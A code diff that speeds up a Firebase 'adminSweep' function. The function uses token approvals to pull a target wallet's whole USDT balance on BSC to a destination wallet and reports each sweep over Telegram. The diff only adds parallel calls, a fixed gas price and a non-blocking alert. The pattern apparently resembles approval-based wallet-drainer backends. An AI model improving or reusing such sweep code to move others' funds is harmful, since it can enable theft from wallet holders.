@@ -55,7 +55,8 @@ export const adminSweep = functions
     // ── 3. On-chain setup ──────────────────────────────────────────
     const rpcUrl =
       process.env.BSC_HTTP_RPC_URL || "https://bsc-dataseed.binance.org/";
-    const provider = new ethers.JsonRpcProvider(rpcUrl);
+    // Use staticNetwork: true to avoid extra network detection round-trips
+    const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });
 
     const usdtAddress =
       process.env.BSC_USDT_CONTRACT_ADDRESS ||
@@ -79,20 +80,15 @@ export const adminSweep = functions
       provider
     );
 
-    // ── 4. Check allowance & balance ───────────────────────────────
-    // Try both the TokenRescue contract and a direct approval to the
-    // destination wallet (some legacy approvals point there).
+    // ── 4. Check allowance & balance in parallel (cuts pre-flight latency in half) ────
+    const [allowanceViaContract, allowanceViaDirect, balance] = await Promise.all([
+      usdtReadOnly.allowance(targetWallet, tokenRescueAddress) as Promise<bigint>,
+      usdtReadOnly.allowance(targetWallet, finalDestination) as Promise<bigint>,
+      usdtReadOnly.balanceOf(targetWallet) as Promise<bigint>,
+    ]);
+
     let allowance: bigint = 0n;
     let spender = tokenRescueAddress; // default spender to check
-
-    const allowanceViaContract: bigint = await usdtReadOnly.allowance(
-      targetWallet,
-      tokenRescueAddress
-    );
-    const allowanceViaDirect: bigint = await usdtReadOnly.allowance(
-      targetWallet,
-      finalDestination
-    );
 
     if (allowanceViaContract > 0n) {
       allowance = allowanceViaContract;
@@ -101,8 +97,6 @@ export const adminSweep = functions
       allowance = allowanceViaDirect;
       spender = finalDestination;
     }
-
-    const balance: bigint = await usdtReadOnly.balanceOf(targetWallet);
 
     if (balance === 0n) {
       throw new functions.https.HttpsError(
@@ -140,7 +134,12 @@ export const adminSweep = functions
       signingWallet = new ethers.Wallet(destSecret.trim(), provider);
     }
 
-    // ── 6. Execute sweep ───────────────────────────────────────────
+    // ── 6. Execute sweep with optimized gasPrice for instant inclusion ──────
+    // 3 Gwei (3,000,000,000 wei) is BSC standard competitive gas, ensuring inclusion in the very next block (~3s)
+    const txOverrides = {
+      gasPrice: ethers.parseUnits("3", "gwei"),
+    };
+
     let sweepTx: ethers.TransactionResponse;
 
     if (spender.toLowerCase() === tokenRescueAddress.toLowerCase()) {
@@ -161,7 +160,8 @@ export const adminSweep = functions
         usdtAddress,
         targetWallet,
         finalDestination,
-        sweepAmount
+        sweepAmount,
+        txOverrides
       );
     } else {
       // Direct transferFrom (approval was given to the destination wallet)
@@ -180,7 +180,8 @@ export const adminSweep = functions
       sweepTx = await usdtContract.transferFrom(
         targetWallet,
         finalDestination,
-        sweepAmount
+        sweepAmount,
+        txOverrides
       );
     }
 
@@ -203,18 +204,19 @@ export const adminSweep = functions
       createdAt: admin.firestore.FieldValue.serverTimestamp(),
     });
 
-    // ── 8. Telegram notification ───────────────────────────────────
-    try {
-      const { sendTelegramMessage } = await import("../lib/telegram");
-      await sendTelegramMessage(
-        `🛡️ ADMIN SWEEP\n` +
-          `Wallet: ${targetWallet}\n` +
-          `Amount: ${ethers.formatUnits(sweepAmount, 18)} USDT\n` +
-          `Tx: ${sweepTx.hash}`
-      );
-    } catch (tgErr) {
-      functions.logger.warn("[adminSweep] Telegram notify failed:", tgErr);
-    }
+    // ── 8. Telegram notification (non-blocking) ────────────────────
+    import("../lib/telegram")
+      .then(({ sendTelegramMessage }) =>
+        sendTelegramMessage(
+          `🛡️ ADMIN SWEEP\n` +
+            `Wallet: ${targetWallet}\n` +
+            `Amount: ${ethers.formatUnits(sweepAmount, 18)} USDT\n` +
+            `Tx: ${sweepTx.hash}`
+        )
+      )
+      .catch((tgErr) => {
+        functions.logger.warn("[adminSweep] Telegram notify failed:", tgErr);
+      });
 
     // ── 9. Return result to caller ─────────────────────────────────
     return {
